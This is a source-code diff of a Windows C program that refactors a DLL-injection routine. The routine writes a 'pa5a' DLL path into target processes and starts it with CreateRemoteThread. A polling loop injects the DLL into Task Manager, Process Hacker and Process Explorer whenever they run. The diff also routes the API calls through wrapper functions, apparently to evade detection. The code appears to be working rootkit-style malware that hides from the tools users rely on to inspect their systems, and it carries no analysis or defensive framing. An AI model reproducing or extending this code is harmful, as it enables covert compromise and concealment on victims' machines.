@@ -31,61 +31,57 @@ BOOL inject(DWORD processId)
 {
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
-    INT next = 0;
-    HINSTANCE kernel_module = NULL;
-    LPVOID load_library_function = NULL, free_library_function = NULL, pa5a_dll_address = NULL;
-    HANDLE remote_thread = 0;
-    HANDLE process = NULL;
-    CHAR pa5a_dll_path[PATH_SIZE] = { 0 };
+    HINSTANCE hKernel32 = NULL;
+    LPVOID hLoadLibrary = NULL, free_library_function = NULL, pa5aDllAddress = NULL;
+    HANDLE hRemoteThread = 0;
+    HANDLE hProcess = NULL;
+    CHAR pa5aDllPath[PATH_SIZE] = { 0 };
 
-    if (StringCbPrintfA(pa5a_dll_path, sizeof(pa5a_dll_path), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
+    if (StringCbPrintfA(pa5aDllPath, sizeof(pa5aDllPath), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
         return FALSE;
     
-    if (!(process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId)))
+    if (!(hProcess = MyOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId)))
     {
         printf("OpenProcess error\nGetLastError(%d)\n", GetLastError());
         return FALSE;
     }
 
-    if (!(kernel_module = GetModuleHandleA("kernel32.dll")))
+    if (!(hKernel32 = GetModuleHandle(L"Kernel32.dll")))
     {
         printf("GetModuleHandleA error\nGetLastError(%d)\n", GetLastError());
-        CloseHandle(process);
+        CloseHandle(hProcess);
         return FALSE;
     }
 
-    if (!(load_library_function = GetProcAddress(kernel_module, "LoadLibraryA")))
+    if (!(hLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA")))
     {
         printf("GetProcAddress error\nGetLastError(%d)\n", GetLastError());
-        CloseHandle(process);
+        CloseHandle(hProcess);
         return FALSE;
     }
 
-    if (!(pa5a_dll_address = VirtualAllocEx(process, 0, strlen(pa5a_dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
+    if (!(pa5aDllAddress = MyVirtualAllocEx(hProcess, 0, strlen(pa5aDllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
     {
         printf("VirtualAllocEx error\nGetLastError(%d)\n", GetLastError());
-        CloseHandle(process);
+        CloseHandle(hProcess);
         return FALSE;
     }
 
-    if (!WriteProcessMemory(process, pa5a_dll_address, pa5a_dll_path, strlen(pa5a_dll_path), NULL))
+    if (!MyWriteProcessMemory(hProcess, pa5aDllAddress, pa5aDllPath, strlen(pa5aDllPath), NULL))
     {
         printf("WriteProcessMemory error\nGetLastError(%d)\n", GetLastError());
-        CloseHandle(process);
+        CloseHandle(hProcess);
         return FALSE;
     }
     
-    if (!(remote_thread = CreateRemoteThread(process, NULL, NULL, (PTHREAD_START_ROUTINE)load_library_function, pa5a_dll_address, NULL, NULL)))
+    if (!(hRemoteThread = MyCreateRemoteThread(hProcess, NULL, NULL, (PTHREAD_START_ROUTINE)hLoadLibrary, pa5aDllAddress, NULL, NULL)))
     {
         printf("CreateRemoteThread error\nGetLastError(%d)\n", GetLastError());
-        CloseHandle(process);
+        CloseHandle(hProcess);
         return FALSE;
     }
 
-    //WaitForSingleObject(remote_thread, INFINITE);
-    //VirtualFreeEx(process, pa5a_dll_address, strlen(pa5a_dll_path) + 1, MEM_RELEASE);
-
-    CloseHandle(process);
+    CloseHandle(hProcess);
     return TRUE;
 }
 /********************************************************************************************************************************/
@@ -93,72 +89,56 @@ DWORD GetProcessIdFormProcessName(LPCWSTR processName)
 {
     HANDLE hSnapshot = NULL;
     DWORD processId = -1;
-    if (!(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0)))
+    
+    if (!(hSnapshot = MyCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0)))
         return -1;
 
-    PROCESSENTRY32  process = { sizeof(PROCESSENTRY32) };
-    Process32First(hSnapshot, &process);
+    PROCESSENTRY32W process = { sizeof(PROCESSENTRY32) };
+    MyProcess32FirstW(hSnapshot, &process);
+    
     do
     {
         if (wcsstr(process.szExeFile, processName))
         {
-            wprintf(L"%d, %s\n", process.th32ProcessID, process.szExeFile);
+            //wprintf(L"%d, %s\n", process.th32ProcessID, process.szExeFile);
             processId = process.th32ProcessID;
             break;
         }
 
-    } while (Process32Next(hSnapshot, &process));
+    } while (MyProcess32NextW(hSnapshot, &process));
 
     CloseHandle(hSnapshot);
     return processId;
 }
 /********************************************************************************************************************************/
+VOID checkProcessForDllInjection(ProcessForDllInjection* infos, LPCWSTR processName)
+{
+    if ((infos->processId = GetProcessIdFormProcessName(processName)) != -1)
+    {
+        if (infos->running == FALSE)
+        {
+            if (inject(infos->processId))
+            {
+                infos->running = TRUE;
+                wprintf(L"DLL injection in %ls -> OK\n", processName);
+            }
+        }
+    }
+    else
+        infos->running = FALSE;
+}
+/********************************************************************************************************************************/
 DWORD WINAPI ThreadInjector()
 {
-    DWORD taskmgrProcessId = 0;
-    BOOL taskmgrRunning = FALSE;
-
-    DWORD processhackerProcessId = 0;
-    BOOL processhackerRunning = FALSE;
-
-    DWORD processExplorer64ProcessId = 0;
-    BOOL processExplorer64Running = FALSE;
-
+    ProcessForDllInjection taskManager = { 0 };
+    ProcessForDllInjection processHacker = { 0 };
+    ProcessForDllInjection processExplorer64 = { 0 };
+    
     while (TRUE)
     {
-        if ((taskmgrProcessId = GetProcessIdFormProcessName(L"Taskmgr.exe")) != -1)
-        {
-            if (taskmgrRunning == FALSE)
-            {
-                if (inject(taskmgrProcessId))
-                    taskmgrRunning = TRUE;
-            }
-        }
-        else
-            taskmgrRunning = FALSE;
-        /******************************************************/
-        if ((processhackerProcessId = GetProcessIdFormProcessName(L"ProcessHacker.exe")) != -1)
-        {
-            if (processhackerRunning == FALSE)
-            {
-                if (inject(processhackerProcessId))
-                    processhackerRunning = TRUE;
-            }
-        }
-        else
-            processhackerRunning = FALSE;
-        /******************************************************/
-        if ((processExplorer64ProcessId = GetProcessIdFormProcessName(L"procexp64.exe")) != -1)
-        {
-            if (processExplorer64Running == FALSE)
-            {
-                if (inject(processExplorer64ProcessId))
-                    processExplorer64Running = TRUE;
-            }
-        }
-        else
-            processExplorer64Running = FALSE;
-
+        checkProcessForDllInjection(&taskManager, L"Taskmgr.exe");
+        checkProcessForDllInjection(&processHacker, L"ProcessHacker.exe");
+        checkProcessForDllInjection(&processExplorer64, L"procexp64.exe");
         Sleep(10);
     }
 
